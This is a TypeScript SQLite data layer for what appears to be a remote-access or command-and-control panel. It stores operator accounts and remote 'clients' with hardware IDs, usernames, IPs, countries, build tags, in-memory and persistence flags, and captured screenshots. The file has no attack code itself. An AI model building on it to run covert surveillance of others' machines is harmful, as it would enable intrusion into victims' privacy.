import { Database } from "bun:sqlite";
import path from "path";
import { getDataDir, loadConfig } from "./config";

let _db: Database | null = null;

export function getDb(): Database {
  if (_db) return _db;
  const dbPath = path.join(getDataDir(), "nubyone.db");
  _db = new Database(dbPath);
  _db.exec("PRAGMA journal_mode=WAL");
  _db.exec("PRAGMA synchronous=NORMAL");
  _db.exec("PRAGMA foreign_keys=ON");
  _db.exec("PRAGMA busy_timeout=5000");
  _db.exec("PRAGMA cache_size=-32000");
  initSchema(_db);
  return _db;
}

function initSchema(db: Database) {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'tech',
      created_at INTEGER NOT NULL DEFAULT (unixepoch()),
      last_login INTEGER,
      created_by TEXT
    );

    CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      hwid TEXT,
      host TEXT,
      os TEXT,
      arch TEXT,
      version TEXT,
      username TEXT,
      ip TEXT,
      country TEXT,
      build_tag TEXT,
      build_id TEXT DEFAULT '',
      status TEXT NOT NULL DEFAULT 'offline',
      last_seen INTEGER NOT NULL DEFAULT (unixepoch()),
      created_at INTEGER NOT NULL DEFAULT (unixepoch()),
      tag TEXT DEFAULT '',
      note TEXT DEFAULT '',
      public_key TEXT DEFAULT '',
      in_memory INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS screenshots (
      id TEXT PRIMARY KEY,
      client_id TEXT NOT NULL,
      data TEXT NOT NULL,
      format TEXT NOT NULL DEFAULT 'jpeg',
      captured_at INTEGER NOT NULL,
      created_at INTEGER NOT NULL DEFAULT (unixepoch())
    );

    CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status);
    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
    CREATE INDEX IF NOT EXISTS idx_screenshots_client ON screenshots(client_id, captured_at DESC);

  `);

  // Migrations for existing databases
  const migrations = [
    "ALTER TABLE users ADD COLUMN last_login INTEGER",
    "ALTER TABLE users ADD COLUMN created_by TEXT",
    "ALTER TABLE clients ADD COLUMN build_id TEXT DEFAULT ''",
    "ALTER TABLE clients ADD COLUMN nickname TEXT DEFAULT ''",
    "ALTER TABLE clients ADD COLUMN persistent INTEGER DEFAULT 0",
    "ALTER TABLE clients ADD COLUMN persistent_at INTEGER DEFAULT NULL",
  ];
  for (const sql of migrations) {
    try {
      db.exec(sql);
    } catch (e: any) {
      const msg: string = e?.message ?? String(e);
      // Silence expected "duplicate column" errors from already-applied migrations.
      if (!msg.includes("duplicate column") && !msg.includes("already exists")) {
        console.warn("[db] migration warning:", msg, "| SQL:", sql);
      }
    }
  }
}

export function ensureAdminUser() {
  const config = loadConfig();
  const existing = getUserByUsername(config.adminUser);
  if (!existing) {
    const hash = Bun.password.hashSync(config.adminPass);
    createUser(config.adminUser, hash, "admin");
    console.log(`[db] Created default admin user: ${config.adminUser}`);
  } else {
    // Always sync the password from ADMIN_PASS on startup so that changing
    // the env var on the VPS (or in deploy.sh) takes effect immediately on
    // the next restart without needing to wipe the database.
    const match = Bun.password.verifySync(config.adminPass, existing.password_hash);
    if (!match) {
      const hash = Bun.password.hashSync(config.adminPass);
      updateUserPassword(existing.id, hash);
      console.log(`[db] Admin password synced from ADMIN_PASS env var for user: ${config.adminUser}`);
    }
  }
}

export function getUserByUsername(username: string) {
  return getDb().query("SELECT * FROM users WHERE username = ?").get(username) as any;
}

export function getUserById(id: number) {
  return getDb().query("SELECT * FROM users WHERE id = ?").get(id) as any;
}

export function createUser(username: string, passwordHash: string, role = "tech", createdBy = "") {
  getDb().run(
    "INSERT INTO users (username, password_hash, role, created_by) VALUES (?, ?, ?, ?)",
    [username, passwordHash, role, createdBy]
  );
}

export function getAllUsers() {
  return getDb().query("SELECT id, username, role, created_at, last_login, created_by FROM users ORDER BY created_at DESC").all() as any[];
}

export function updateUserRole(id: number, role: string) {
  getDb().run("UPDATE users SET role = ? WHERE id = ?", [role, id]);
}

export function updateUserPassword(id: number, passwordHash: string) {
  getDb().run("UPDATE users SET password_hash = ? WHERE id = ?", [passwordHash, id]);
}

export function deleteUserById(id: number) {
  getDb().run("DELETE FROM users WHERE id = ?", [id]);
}

export function recordUserLogin(id: number) {
  getDb().run("UPDATE users SET last_login = unixepoch() WHERE id = ?", [id]);
}

export function upsertClient(client: {
  id: string;
  hwid?: string;
  host?: string;
  os?: string;
  arch?: string;
  version?: string;
  username?: string;
  ip?: string;
  country?: string;
  buildTag?: string;
  buildId?: string;
  status?: string;
  publicKey?: string;
  inMemory?: boolean;
}) {
  getDb().run(`
    INSERT INTO clients (id, hwid, host, os, arch, version, username, ip, country, build_tag, build_id, status, public_key, in_memory, last_seen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, unixepoch())
    ON CONFLICT(id) DO UPDATE SET
      hwid = excluded.hwid,
      host = excluded.host,
      os = excluded.os,
      arch = excluded.arch,
      version = excluded.version,
      username = excluded.username,
      ip = excluded.ip,
      country = excluded.country,
      build_tag = excluded.build_tag,
      build_id = excluded.build_id,
      status = excluded.status,
      public_key = excluded.public_key,
      in_memory = excluded.in_memory,
      last_seen = unixepoch()
  `, [
    client.id,
    client.hwid ?? "",
    client.host ?? "",
    client.os ?? "",
    client.arch ?? "",
    client.version ?? "",
    client.username ?? "",
    client.ip ?? "",
    client.country ?? "",
    client.buildTag ?? "",
    client.buildId ?? "",
    client.status ?? "online",
    client.publicKey ?? "",
    client.inMemory ? 1 : 0,
  ]);
}

export function setClientStatus(id: string, status: string) {
  getDb().run(
    "UPDATE clients SET status = ?, last_seen = unixepoch() WHERE id = ?",
    [status, id]
  );
}

export function setClientPersistent(id: string, persistent: boolean) {
  getDb().run(
    "UPDATE clients SET persistent = ?, persistent_at = CASE WHEN ? = 1 THEN unixepoch() ELSE persistent_at END WHERE id = ?",
    [persistent ? 1 : 0, persistent ? 1 : 0, id]
  );
}

export function getClientById(id: string) {
  const row = getDb().query("SELECT * FROM clients WHERE id = ?").get(id) as any;
  if (!row) return null;
  return parseClientRow(row);
}

export function listClients(opts: {
  status?: string;
  search?: string;
  limit?: number;
  offset?: number;
} = {}) {
  const { status, search, limit = 200, offset = 0 } = opts;
  const conditions: string[] = [];
  const params: any[] = [];

  if (status && status !== "all") {
    conditions.push("status = ?");
    params.push(status);
  }
  if (search) {
    conditions.push("(host LIKE ? OR username LIKE ? OR ip LIKE ? OR id LIKE ? OR nickname LIKE ?)");
    const like = `%${search}%`;
    params.push(like, like, like, like, like);
  }

  const where = conditions.length > 0 ? `WHERE ${conditions.join(" AND ")}` : "";
  const rows = getDb().query(
    `SELECT * FROM clients ${where} ORDER BY last_seen DESC LIMIT ? OFFSET ?`
  ).all(...params, limit, offset) as any[];
  return rows.map(parseClientRow);
}

export function countClients(opts: { status?: string } = {}) {
  const { status } = opts;
  if (status && status !== "all") {
    return (getDb().query("SELECT COUNT(*) as n FROM clients WHERE status = ?").get(status) as any)?.n ?? 0;
  }
  return (getDb().query("SELECT COUNT(*) as n FROM clients").get() as any)?.n ?? 0;
}

export function deleteClient(id: string) {
  getDb().run("DELETE FROM clients WHERE id = ?", [id]);
}

export function updateClientTagNote(id: string, tag: string, note: string) {
  getDb().run("UPDATE clients SET tag = ?, note = ? WHERE id = ?", [tag, note, id]);
}

export function updateClientNickname(id: string, nickname: string) {
  getDb().run("UPDATE clients SET nickname = ? WHERE id = ?", [nickname ?? "", id]);
}

// ── Screenshot persistence ────────────────────────────────────────────────────
const SCREENSHOT_MAX = 10;

export function storeScreenshot(clientId: string, entry: {
  id: string;
  data: string;
  format: string;
  capturedAt: number;
}): void {
  const db = getDb();
  db.run(
    "INSERT OR REPLACE INTO screenshots (id, client_id, data, format, captured_at) VALUES (?, ?, ?, ?, ?)",
    [entry.id, clientId, entry.data, entry.format, entry.capturedAt]
  );
  // Trim to max per client — keep the SCREENSHOT_MAX most recent rows
  db.run(`
    DELETE FROM screenshots
    WHERE client_id = ?
      AND id NOT IN (
        SELECT id FROM screenshots
        WHERE client_id = ?
        ORDER BY captured_at DESC
        LIMIT ?
      )
  `, [clientId, clientId, SCREENSHOT_MAX]);
}

export function getClientScreenshots(clientId: string): {
  id: string;
  data: string;
  format: string;
  capturedAt: number;
}[] {
  const rows = getDb()
    .query("SELECT id, data, format, captured_at FROM screenshots WHERE client_id = ? ORDER BY captured_at DESC LIMIT ?")
    .all(clientId, SCREENSHOT_MAX) as any[];
  return rows.map(r => ({ id: r.id, data: r.data, format: r.format, capturedAt: r.captured_at }));
}

export function deleteClientScreenshots(clientId: string): void {
  getDb().run("DELETE FROM screenshots WHERE client_id = ?", [clientId]);
}

function parseClientRow(row: any) {
  if (!row) return null;
  return {
    ...row,
    inMemory: row.in_memory === 1,
  };
}

